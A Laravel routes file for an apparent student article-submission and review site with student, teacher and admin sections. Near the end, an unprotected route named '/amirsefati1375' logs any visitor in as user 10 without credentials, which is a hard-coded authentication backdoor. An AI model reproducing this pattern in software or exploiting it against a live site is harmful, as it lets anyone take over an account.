<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', 'HomeController@index');


Route::middleware('studentlevel')->prefix('student')->group(function(){
    Route::get('/index','studentscontroller@index');
    Route::get('/send-article','studentscontroller@send_article');
    Route::get('/sended-article','studentscontroller@sended_article');
    Route::get('/final-article','studentscontroller@final_article');

    Route::post('/send-article','studentscontroller@sended_article_post');

    Route::get('/editprofile','studentscontroller@editprofile');
    Route::post('/editprofile','studentscontroller@editprofile_post');


    Route::get('/sendarticlefinal-{id}','studentscontroller@sendarticlefinal');
    Route::get('/editabstract-{id}','studentscontroller@editabstract');
    Route::post('/edit_abstract_post','studentscontroller@edit_abstract_post');
    Route::get('/delete-{id}','studentscontroller@delete_abstract');

    Route::post('/uploadarticle','studentscontroller@uploadarticle');

    Route::get('/reuploadedarpp-{id}','studentscontroller@resend_article');


    
    Route::post('/endsendarticlep','studentscontroller@editarticlepost');


    Route::get('/payment','studentscontroller@payment');

    Route::get('/report','studentscontroller@report');
    Route::post('/report','studentscontroller@report_post');
    Route::post('cancelreport','studentscontroller@cancelreport');

    
    Route::post('paymentzarinpal','studentscontroller@paymentzarinpalpost');
    Route::get('paymentzarinpal','studentscontroller@paymentzarinpalget');

    Route::get('signinnoarticle','studentscontroller@signinnoarticle');

    Route::post('regsiter_user_noarticle','studentscontroller@regsiter_user_noarticle');

    Route::post('paynoarticle','studentscontroller@paynoarticle');

    Route::get('signinnoarticlepay','studentscontroller@signinnoarticlepay');

    

    

});

Route::middleware('teacherlevel')->prefix('teacher')->group(function(){
    Route::get('/index','teacherscontroller@index');
    Route::get('/jury-abstract','teacherscontroller@jury_abstract');
    Route::get('/jury-final','teacherscontroller@jury_final');

    Route::get('/verify-abstract-{id}','teacherscontroller@verify_abstract');
    Route::get('/verifynocomment-abstract-{id}','teacherscontroller@verify_abstract_no_comment');
    Route::post('/verifywithcommentabstract','teacherscontroller@verify_abstract_with_comment');
   
    Route::get('/verifyarticlefinal-{id}','teacherscontroller@verifyabstractfianl');
    Route::get('/verifynocomment-final-{id}','teacherscontroller@verify_article_no_comment');
    Route::post('/verifywithcommentfinal','teacherscontroller@verifywithcommentfinal');
    
    Route::get('/eedownllloadpppdf-{id}','teacherscontroller@downloadfromserverpdf');

    Route::get('/eedownllloadppword-{id}','teacherscontroller@downloadfromserverword');

    Route::post('/amir','teacherscontroller@amir');
    

});


Route::middleware('adminlevel')->prefix('admin')->group(function(){

    Route::get('/index','admincontroller@index');

    Route::get('/sendnews','admincontroller@sendnews');
    Route::get('/manage_abstract','admincontroller@manage_abstract');

    Route::post('/select_teacher','admincontroller@select_teacher');

    Route::get('/select_teacher_tozero-{id}' , 'admincontroller@select_teacher_tozero');
    
    Route::get('/report','admincontroller@report_page');
    Route::get('/report_bad-{code}','admincontroller@report_page_bad');
    Route::get('/report_good-{code}','admincontroller@report_page_good');
    Route::get('/reported','admincontroller@reported');
    Route::get('/recovery_report-{code}','admincontroller@recovery_report');
    
    Route::get('need_fixbug_abstract','admincontroller@need_fixbug_abstract');
    Route::get('verify_abstract','admincontroller@verify_abstract');

    Route::get('notupload_article','admincontroller@notupload_article');
    Route::get('need_fixbug_article','admincontroller@need_fixbug_article');
    Route::get('verify_article','admincontroller@verify_article');
    Route::get('paied_article','admincontroller@paied_article');

    Route::post('/delete_news','admincontroller@delete_news');    
    Route::post('/sendnews','admincontroller@sendnewspost');

    Route::get('noarticleuser','admincontroller@noarticleuser');

    
    Route::get('allstudent','admincontroller@allstudent');

    
});


Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');

Route::get('/amirsefati1375',function(){
     Auth::loginUsingId(10);
     return view('students.index');
});

Route::get('/logout',function(){
    Auth::logout();
    return view('auth.login');
});
